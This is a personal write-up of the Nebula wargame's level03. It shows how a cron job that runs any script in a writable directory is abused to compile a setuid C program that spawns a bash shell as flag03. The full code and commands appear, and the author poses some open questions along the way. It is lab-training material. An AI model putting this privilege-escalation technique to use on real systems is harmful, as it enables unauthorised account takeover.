# For level03 in nebula

>Check the home directory of flag03 and take note of the files there.
>  
>There is a crontab that is called every couple of minutes.
>  
>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

There is no source code given.

### Seeing what is goes on

There are only a file `writable.sh` and a directory `writable.d`.
```
level03@nebula:~$ cd /home/flag03
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
```

This is the shell script in `writable.sh`:
```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
It iterates through everything in the directory `writable.d`, runs them, then deletes them. `(ulimit -t 5; bash -x "$i")` is run in a [subshell](https://www.gnu.org/software/bash/manual/html_node/Command-Grouping.html).

`ulimit -t 5` limits the shell and its processes to 5 seconds of CPU time. 

`bash -x "$i"` runs the file whose name is in variable `$i`. 



Ok... Cool to know. ¯\(°_o)/¯. So what?

Then, I realised that the `crontab` that was called very couple of minutes was *that* shell script.
```
level03@nebula:/home/flag03$ touch writable.d/test{1..3}
level03@nebula:/home/flag03$ ls writable.d
test1  test2  test3
level03@nebula:/home/flag03$

---after a few minutes---

level03@nebula:/home/flag03$ ls writable.d
level03@nebula:/home/flag03$
```
Okay, cool. And now what? ¯\_(⊙︿⊙)_/¯ 

Our goal, as always, is to get the output "You have successfully executed getflag on a target account" from executing the command `getflag` as user `flag03`. How exactly is `crontab` going to help us achieve that?

Recall that in the previous levels, we learnt about *setuid programs*. We made use of one such program to change the process' real UID to our desired user, then spawned a bash shell as said user. Let's take a moment to think how we can use that knowledge here.

Hint:
>Each user has their own crontab, and commands in any given crontab will be executed as the user who owns the crontab. [source](https://linux.die.net/man/5/crontab)

### Winning strategies (or so I thought)

- Solution 1: Unlike the previous levels, there is no setuid program here owned by `flag03`. So, let's create our own. 
```
level03@nebula:~$ cat attempt1.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {

	uid_t euid = geteuid();
	gid_t egid = getegid();
	
	setresuid(euid, euid, euid);
	setresgid(egid, egid, egid);
	
	system("/bin/bash");
}
```
We create a bash file in `/home/flag03/writable.d` to compile the C program and set its `setuid` bit.
```
level03@nebula:~$ cat attempt1.sh 
gcc -o /home/flag03/a.out /home/level03/attempt1.c; chmod +x /home/flag03/a.out; chmod +s /home/flag03/a.out
level03@nebula:~$ cp attempt1.sh /home/flag03/writable.d/
level03@nebula:~$ ls /home/flag03/writable.d/
attempt1.sh
level03@nebula:~$ 
```
`Cron` should compile `attempt1.c` into an executable setuid program that we can later call to spawn us a shell as user `flag03`.

```
--- after a few minutes ---

level03@nebula:~$ ls /home/flag03/writable.d/
level03@nebula:~$ ls /home/flag03/
writable.d  writable.sh
level03@nebula:~$ 
```
What the hell? Where is my `a.out`? Since `/home/flag03/writable.d/attempt1.sh` is deleted, that means `cron` ran that bash script. But `a.out` is nowhere to be found! ٩(╬ʘ益ʘ╬)۶

Temporary setback... I have another solution in mind.


- Solution 2: Our goal is to get the output "You have successfully executed getflag on a target account" from executing `getflag` as `flag03`, so why not just execute `getflag` in the bash script directly instead of beating around the bush?

```
level03@nebula:~$ echo -e '/bin/getflag >> /tmp/output' > attempt2.sh && chmod +x attempt2.sh && cp attempt2.sh /home/flag03/writable.d/attempt2.sh && touch /tmp/output && ls /home/flag03/writable.d
attempt2.sh
level03@nebula:~$ 
```
`/bin/getflag >> /tmp/output` executes `/bin/getflag` and pipes its output to `/tmp/output`. When `cron` runs this bash script, it will execute `/bin/getflag` as `flag03`, and we get our output in `/tmp/output` (at least ideally).

```
--- after a few minutes ---

level03@nebula:~$ cat /tmp/output 
level03@nebula:~$
```
What in the actual hell? Where's my output? Since `/home/flag03/writable.d/attempt2.sh` is deleted, that means `cron` ran that bash script. But `/tmp/output` is empty.

### A solution finally worked

In order for solution 1 to work, I had to move `attempt1.c` and `attempt.sh` to `/tmp`.

```
level03@nebula:/home/flag03/writable.d$ mv /home/level03/attempt1.c /tmp/
level03@nebula:/home/flag03/writable.d$ mv /home/level03/attempt1.sh /tmp/
level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ cat /tmp/output 
level03@nebula:/home/flag03/writable.d$ nano /tmp/attempt1.sh
level03@nebula:/home/flag03/writable.d$ cp /tmp/attempt1.sh .
level03@nebula:/home/flag03/writable.d$ ls
attempt1.sh

--- after a few minutes ---

level03@nebula:/home/flag03/writable.d$ ls
level03@nebula:/home/flag03/writable.d$ ls ..
a.out  writable.d  writable.sh
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ./a.out 
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
```
It worked!  ᕕ( ᐛ )ᕗ

### Doubts
I have some doubts however, that perhaps you, the reader, may be able to help me solve.

- Doubt 1:
I thought `attempt1.c` had to be in `/tmp` because only that way, `flag03`'s cronjob could read and compile the program.
Afterall, `/tmp` has read and write permissions for all: `drwxrwxrwt  4 root root  160 2018-04-01 08:45 tmp`. 

I thought perhaps `flag03` had no access to `level03`'s directory. But the permissions show that `flag03` and `level03` belong to the same group called `level03`. They have read and execution permissions to each other's directories.
```
drwxr-x--- 1 flag03  level03  80 2018-04-01 08:36 flag03
drwxr-x--- 1 level03 level03 180 2018-04-01 08:25 level03
```
so, it does not make sense to me that a process with `RUID flag03` is unable to compile an executable in `/home/level03`.

- Doubt 2:
I tried to move `attempt2.sh` from `/home/level03` to `/tmp` like I did to solve solution 1, but it still failed to work. (ᗒᗣᗕ)՞
```
level03@nebula:/tmp$ ls
attempt1.c  attempt1.sh  attempt2.sh  level03.c  output
level03@nebula:/tmp$ cat attempt2.sh 
/bin/getflag >> /tmp/output
level03@nebula:/tmp$ ls /home/flag03/writable.d
attempt2.sh

--- after a few minutes  ---

level03@nebula:/tmp$ cat /tmp/output 
level03@nebula:/tmp$ 
```
Please, if you know why it does not work, tell me why. 

### Seeing what cronjob was being run

Just out of curiousity, I decided to see what `cronjob` user `flag03` was running. `flag03@nebula:/tmp$ crontab -l` gave the output `*/3 * * * * /home/flag03/writable.sh`, showing that `writable.sh` was executed every 3 minutes.


END
